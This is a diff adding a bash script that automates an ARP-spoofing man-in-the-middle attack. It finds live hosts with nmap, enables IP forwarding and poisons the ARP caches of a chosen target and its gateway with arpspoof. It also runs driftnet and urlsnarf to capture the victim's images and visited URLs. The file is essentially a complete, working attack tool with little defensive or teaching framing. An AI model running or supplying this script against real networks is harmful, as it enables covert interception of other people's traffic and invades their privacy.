@@ -1,0 +1,103 @@
+#!/bin/bash
+
+#
+# Purpose: Sets up a Man-in-the-Middle (MitM) attack using ARP Spoofing
+
+echo
+echo    "*****************************************"
+echo -e "****** \e[1;31;5mMan in the Middle (MitM) \e[0m*********"
+echo    "*****************************************"
+echo
+
+
+########################## FUNCTIONS ###########################################
+Host_Discovery() {
+	echo
+	nmap -sn -T5 ${NETWORK} -oG - | awk '/Up$/{print $2}'
+	echo
+}
+
+IP_Forwarding() {
+	echo
+	echo "setting up IP Forwarding..."
+	sysctl net.ipv4.ip_forward 
+	echo "setting to 1..."
+	echo "."
+	sleep 1
+	echo "."
+	sleep 1
+	echo "."
+	sleep 1
+	echo 1 > /proc/sys/net/ipv4/ip_forward
+	sysctl net.ipv4.ip_forward
+	echo
+}
+
+ARP_Poison() {
+	xterm -e arpspoof -i ${INTERFACE} -t ${TARGET} ${GATEWAY} > /dev/null 2>&1 & PID1=$!
+	xterm -e arpspoof -i ${INTERFACE} -t ${GATEWAY} ${TARGET} > /dev/null 2>&1 & PID2=$! 
+	xterm -e driftnet -i ${INTERFACE} > /dev/null 2>&1 & PID3=$!
+	xterm -e urlsnarf -i ${INTERFACE} |cut -d\” -f4> /dev/null 2>&1 & PID4=$!
+}
+
+
+#    Using the information gleaned from the ifconfig command, the user must specifiy
+#    the network that they wish to target. This will need to be written in the format
+#    of x.x.x.x/x to specify both the network address and subnet mask, such as 
+#    "192.168.1.0/24"
+
+############################### VARIABLES #####################################
+bold="`tput bold`"
+fg_green="`tput setaf 2`"
+sgr0="`tput sgr0`"
+
+############################### SCRIPT #########################################
+
+echo -e "\e[43mNOTE: if running VM, then network settings must be set to 'Bridged' mode.\e[0m"
+echo
+sleep 1
+read -p "${bold}${fg_green}Enter Network address and Subnet (e.g., '10.0.0.0/24'): ${sgr0}" NETWORK
+
+if [[ $NETWORK =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3} ]]; then
+  Host_Discovery
+else
+  echo "input was not valid."
+  exit 
+fi
+
+echo
+echo "The above hosts are up."
+
+#    SELECT TARGET IP ADDRESS
+echo
+read -p "${bold}${fg_green}Select your Target's IP Address: ${sgr0}" TARGET
+
+#    SELECT GATEWAY IP ADDRESS 
+echo
+read -p "${bold}${fg_green}Select your gateway's IP Address: ${sgr0}" GATEWAY
+
+#    SELECT INTERFACE
+echo
+iwconfig
+read -p "${bold}${fg_green}Select your interface: ${sgr0}" INTERFACE
+
+#    EXECUTE ARP POISON
+
+ARP_Poison
+IP_Forwarding
+
+
+#    EXIT AND DISABLE IP FORWARDING
+
+echo -r "${bold}${fg_green}IP forwarding successfully enabled.${srg0}"
+echo
+echo -e "\e[1;31;5mPress any key to stop spoofing...\e[0m"
+read
+kill -9 $PID1 $PID2 $PID3 $PID4
+echo 0 > /proc/sys/net/ipv4/ip_forward
+sysctl net.ipv4.ip_forward 
+echo
+
+
+
+exit 0
